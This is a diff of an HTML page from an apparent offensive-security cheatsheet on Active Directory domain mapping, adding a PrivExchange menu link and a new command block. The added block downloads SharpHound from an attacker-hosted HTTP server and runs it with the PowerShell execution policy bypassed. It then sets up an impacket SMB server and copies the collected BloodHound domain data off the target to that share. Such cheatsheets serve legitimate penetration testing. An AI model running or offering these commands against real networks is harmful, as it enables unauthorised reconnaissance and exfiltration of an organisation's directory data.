@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:26 CET">
+<meta name="revised" content="2019-11-10T13:28:51 CET">
 <title>Domain Mapping :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1021,6 +1021,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1460,7 +1467,21 @@ C:<span style="color:#8045ff">\&gt;</span> ShardHound.exe --Domain factory.lan -
 https://github.com/fox-it/BloodHound.py
 
 <span style="color:#75715e"># Collection Methods : Default, Group, LocalAdmin, RDP, DCOM, Session, Acl, Trusts, LoggedOn, ObjectProps, All (except LoggedOn)</span>
-bloodhound-python -u USERNAME -p PASSWORD -d DOMAIN --collectionmethod All </code></pre></div>
+bloodhound-python -u USERNAME -p PASSWORD -d DOMAIN --collectionmethod All</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Drop BloodHound ingestor and get results back through SMB Server</span>
+python -m SimpleHTTPServer
+Invoke-WebRequest -Uri “http://10.10.16.112:8000/SharpHound.ps1” -OutFile “.<span style="color:#8045ff">\S</span>harpHound.ps1”
+
+Powershell.exe -Exec Bypass
+Import-Module .<span style="color:#8045ff">\S</span>harphound.ps1
+Invoke-Bloodhound
+Invoke-BloodHound -CollectionMethod All
+
+sudo python smbserver.py testlol /home/xx /tmp
+sudo python smbserver.py -smb2support testlol /home/xx /tmp
+
+net view <span style="color:#8045ff">\\</span><span style="color:#ae81ff">10</span>.10.16.112<span style="color:#8045ff">\T</span>ESTLOL
+
+copy C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\x</span>xx<span style="color:#8045ff">\D</span>ocuments<span style="color:#8045ff">\2</span>0191104044628_BloodHound.zip <span style="color:#8045ff">\\</span><span style="color:#ae81ff">10</span>.10.16.112<span style="color:#8045ff">\T</span>ESTLOL<span style="color:#8045ff">\f</span>ile.zip</code></pre></div>
 <h4 id="analysis">Analysis</h4>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Results will be zipped</span>
 <span style="color:#75715e"># Get back zip, unzip it and upload files into bloodhound</span></code></pre></div>
